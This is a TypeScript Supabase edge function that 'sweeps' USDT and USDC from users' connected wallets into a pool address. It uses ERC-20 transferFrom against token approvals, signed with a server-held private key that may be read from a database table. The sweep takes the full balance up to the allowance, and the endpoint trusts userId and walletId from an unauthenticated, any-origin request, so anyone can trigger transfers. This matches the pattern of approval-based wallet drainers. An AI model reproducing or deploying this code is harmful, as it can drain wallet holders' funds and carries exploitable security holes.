import { serve } from 'https://deno.land/std@0.168.0/http/server.ts';
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.38.4';
import { ethers } from 'https://esm.sh/ethers@6.7.0';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, content-type',
};

interface SweepRequest {
  action: 'check_eligibility' | 'perform_sweep' | 'get_sweep_history' | 'get_stats';
  userId: string;
  walletId?: string;
  poolId?: string;
  autoJoin?: boolean;
}

interface SweepResponse {
  success: boolean;
  data?: any;
  error?: string;
  message?: string;
}

// Token and RPC configuration
const TOKEN_ADDRESSES: Record<string, Record<number, string>> = {
  'USDT': {
    1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    56: '0x55d398326f99059fF775485246999027B3197955',
    137: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
    42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
  },
  'USDC': {
    1: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    56: '0x8AC76a51cc950d9822D68b83fE1Ad97b32Cd580d',
    137: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
    42161: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8',
  },
};

const RPC_ENDPOINTS: Record<number, string> = {
  1: 'https://cloudflare-eth.com',
  56: 'https://bsc-dataseed.binance.org/',
  137: 'https://polygon-rpc.com',
  42161: 'https://arb1.arbitrum.io/rpc',
  10: 'https://mainnet.optimism.io',
  8453: 'https://mainnet.base.org',
};

const ALCHEMY_KEY = Deno.env.get('ALCHEMY_API_KEY') || '';

function getAlchemyRpc(chainId: number): string {
  if (!ALCHEMY_KEY) return RPC_ENDPOINTS[chainId] || '';
  
  const alchemyEndpoints: Record<number, string> = {
    1: `https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
    137: `https://polygon-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
    42161: `https://arb-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
  };
  
  return alchemyEndpoints[chainId] || RPC_ENDPOINTS[chainId];
}

/**
 * Check sweep eligibility for a wallet
 */
async function checkSweepEligibility(
  supabase: any,
  userId: string,
  walletId: string,
  poolId?: string
): Promise<SweepResponse> {
  try {
    // Get wallet details
    const { data: wallet, error: walletError } = await supabase
      .from('connected_wallets')
      .select('*')
      .eq('id', walletId)
      .eq('user_id', userId)
      .single();

    if (walletError || !wallet) {
      return { success: false, error: 'Wallet not found' };
    }

    // Call eligibility function
    const { data: eligibility, error: eligError } = await supabase.rpc(
      'check_sweep_eligibility',
      {
        p_user_id: userId,
        p_wallet_id: walletId,
        p_pool_id: poolId || null,
      }
    );

    if (eligError) {
      return { success: false, error: eligError.message };
    }

    return {
      success: true,
      data: eligibility?.[0] || {
        is_eligible: false,
        eligible_amount: 0,
        reasons: ['Unable to determine eligibility'],
      },
    };
  } catch (err: any) {
    console.error('Sweep eligibility check error:', err);
    return { success: false, error: err.message };
  }
}

/**
 * Perform wallet sweep
 */
async function performSweep(
  supabase: any,
  userId: string,
  walletId: string,
  poolId: string,
  autoJoin: boolean = true
): Promise<SweepResponse> {
  try {
    console.log(`Starting sweep for wallet: ${walletId}, pool: ${poolId}`);

    // Get wallet
    const { data: wallet, error: walletError } = await supabase
      .from('connected_wallets')
      .select('*')
      .eq('id', walletId)
      .eq('user_id', userId)
      .single();

    if (walletError || !wallet) {
      return { success: false, error: 'Wallet not found or not authorized' };
    }

    if (!wallet.verified || wallet.allowance_amount <= 0) {
      return { success: false, error: 'Wallet not verified or has no allowance' };
    }

    // Get pool
    const { data: pool, error: poolError } = await supabase
      .from('pools')
      .select('*')
      .eq('id', poolId)
      .single();

    if (poolError || !pool) {
      return { success: false, error: 'Pool not found' };
    }

    if (pool.status !== 'open') {
      return { success: false, error: 'Pool is not open for sweeping' };
    }

    // Get pool wallet address
    const { data: poolAddress, error: poolAddressError } = await supabase
      .from('pool_addresses')
      .select('*')
      .eq('chain_id', wallet.chain_id)
      .eq('is_active', true)
      .single();

    if (poolAddressError || !poolAddress) {
      return { success: false, error: `No pool wallet configured for chain ${wallet.chain_id}` };
    }

    // Get chain private key
    const privateKeyEnv = `POOL_WALLET_PRIVATE_KEY_${wallet.chain_id}`;
    let privateKey = Deno.env.get(privateKeyEnv);

    if (!privateKey) {
      const { data: keyData } = await supabase
        .from('admin_secrets')
        .select('key_value')
        .eq('key_name', privateKeyEnv)
        .single();
      privateKey = keyData?.key_value;
    }

    if (!privateKey) {
      privateKey = Deno.env.get('POOL_WALLET_PRIVATE_KEY');
    }

    if (!privateKey) {
      return { success: false, error: 'Pool wallet private key not configured' };
    }

    // Normalize and validate private key
    const cleanKey = privateKey.trim().startsWith('0x')
      ? privateKey.trim()
      : `0x${privateKey.trim()}`;

    if (!/^0x[a-fA-F0-9]{64}$/.test(cleanKey)) {
      throw new Error('Invalid private key format');
    }

    const tokenSymbol = wallet.token_approved || 'USDT';
    const tokenAddr = TOKEN_ADDRESSES[tokenSymbol]?.[wallet.chain_id];

    if (!tokenAddr) {
      return { success: false, error: `Token ${tokenSymbol} not configured for chain ${wallet.chain_id}` };
    }

    const rpcUrl = getAlchemyRpc(wallet.chain_id);
    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const poolWallet = new ethers.Wallet(cleanKey, provider);

    // ERC20 ABI
    const erc20ABI = [
      'function balanceOf(address account) view returns (uint256)',
      'function allowance(address owner, address spender) view returns (uint256)',
      'function transferFrom(address from, address to, uint256 amount) returns (bool)',
      'function decimals() view returns (uint8)',
    ];

    const contract = new ethers.Contract(tokenAddr, erc20ABI, poolWallet);

    // Get token decimals
    let decimals = 6;
    try {
      decimals = await contract.decimals();
    } catch (e) {
      console.log('Using default decimals: 6');
    }

    // Check balance and allowance
    const balance = await contract.balanceOf(wallet.wallet_address);
    const allowance = await contract.allowance(wallet.wallet_address, poolWallet.address);

    console.log(`Balance: ${ethers.formatUnits(balance, decimals)}, Allowance: ${ethers.formatUnits(allowance, decimals)}`);

    if (balance === 0n) {
      return { success: false, error: 'Wallet has no tokens to sweep' };
    }

    if (allowance === 0n) {
      return { success: false, error: 'Wallet has no token allowance' };
    }

    // Calculate sweep amount
    const amountToSweep = balance < allowance ? balance : allowance;
    const minSweepAmount = ethers.parseUnits('10', decimals);

    if (amountToSweep < minSweepAmount) {
      return {
        success: false,
        error: `Sweep amount too small. Minimum $10 required. Current: $${ethers.formatUnits(amountToSweep, decimals)}`,
      };
    }

    // Send transaction
    console.log(`Sending ${ethers.formatUnits(amountToSweep, decimals)} ${tokenSymbol} to ${poolAddress.address}`);

    const tx = await contract.transferFrom(wallet.wallet_address, poolAddress.address, amountToSweep);
    const receipt = await tx.wait(1);

    if (!receipt || receipt.status !== 1) {
      throw new Error('Transaction failed or not confirmed');
    }

    const sweepAmount = Number(ethers.formatUnits(amountToSweep, decimals));

    // Log sweep transaction
    await supabase.rpc('log_sweep_transaction', {
      p_user_id: userId,
      p_wallet_id: walletId,
      p_pool_id: poolId,
      p_amount: sweepAmount,
      p_currency: tokenSymbol,
      p_tx_hash: receipt.hash,
      p_chain_id: wallet.chain_id,
      p_pool_joined: autoJoin,
    });

    // Auto-join pool if enabled
    let joinResult = null;
    if (autoJoin) {
      const { data: existingJoin } = await supabase
        .from('pool_participants')
        .select('*')
        .eq('pool_id', poolId)
        .eq('user_id', userId)
        .single();

      if (!existingJoin) {
        const { data: joinData, error: joinError } = await supabase
          .from('pool_participants')
          .insert({
            pool_id: poolId,
            user_id: userId,
            joined_at: new Date().toISOString(),
            contribution_amount: sweepAmount,
            contribution_currency: tokenSymbol,
            status: 'active',
          })
          .select()
          .single();

        if (!joinError) {
          joinResult = joinData;

          // Update pool amount
          await supabase.rpc('increment_pool_amount', {
            pool_id: poolId,
            amount: sweepAmount,
          });
        }
      }
    }

    // Create success notification
    await supabase.from('sweep_notifications').insert({
      user_id: userId,
      type: 'pool_sweep_success',
      title: 'Sweep Completed',
      message: `Successfully swept ${sweepAmount} ${tokenSymbol} for "${pool.name}"`,
      wallet_id: walletId,
      metadata: {
        pool_id: poolId,
        amount: sweepAmount,
        tx_hash: receipt.hash,
      },
    });

    return {
      success: true,
      data: {
        sweep: {
          tx_hash: receipt.hash,
          amount: sweepAmount,
          currency: tokenSymbol,
        },
        pool_join: joinResult,
        message: `Successfully swept ${sweepAmount} ${tokenSymbol}${autoJoin && joinResult ? ' and joined pool' : ''}`,
      },
    };
  } catch (err: any) {
    console.error('Sweep error:', err);

    // Log error notification
    await supabase
      .from('sweep_notifications')
      .insert({
        user_id: userId,
        type: 'pool_sweep_failed',
        title: 'Sweep Failed',
        message: err.message,
        wallet_id: walletId,
        metadata: { pool_id: poolId, error: err.message },
      })
      .catch(() => {});

    return { success: false, error: err.message };
  }
}

/**
 * Get sweep history
 */
async function getSweepHistory(supabase: any, userId: string): Promise<SweepResponse> {
  try {
    const { data, error } = await supabase
      .from('sweep_history')
      .select('*')
      .eq('user_id', userId)
      .order('created_at', { ascending: false })
      .limit(50);

    if (error) return { success: false, error: error.message };

    return { success: true, data: data || [] };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

/**
 * Get sweep statistics
 */
async function getSweepStats(supabase: any, userId: string): Promise<SweepResponse> {
  try {
    const { data, error } = await supabase.rpc('get_sweep_stats', {
      p_user_id: userId,
    });

    if (error) return { success: false, error: error.message };

    return { success: true, data: data?.[0] || {} };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

// Main handler
serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders });
  }

  try {
    const body = await req.json().catch(() => ({}));
    const { action, userId, walletId, poolId, autoJoin } = body;

    // Validate environment
    const supabaseUrl = Deno.env.get('SUPABASE_URL');
    const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY');

    if (!supabaseUrl || !supabaseKey) {
      return new Response(
        JSON.stringify({ error: 'Server configuration error' }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const supabase = createClient(supabaseUrl, supabaseKey);

    // Route action
    let result: SweepResponse;

    switch (action) {
      case 'check_eligibility':
        result = await checkSweepEligibility(supabase, userId, walletId, poolId);
        break;

      case 'perform_sweep':
        result = await performSweep(supabase, userId, walletId, poolId, autoJoin);
        break;

      case 'get_sweep_history':
        result = await getSweepHistory(supabase, userId);
        break;

      case 'get_stats':
        result = await getSweepStats(supabase, userId);
        break;

      default:
        result = { success: false, error: 'Unknown action' };
    }

    return new Response(JSON.stringify(result), {
      status: result.success ? 200 : 400,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  } catch (err: any) {
    console.error('Request error:', err);
    return new Response(
      JSON.stringify({ success: false, error: err.message }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
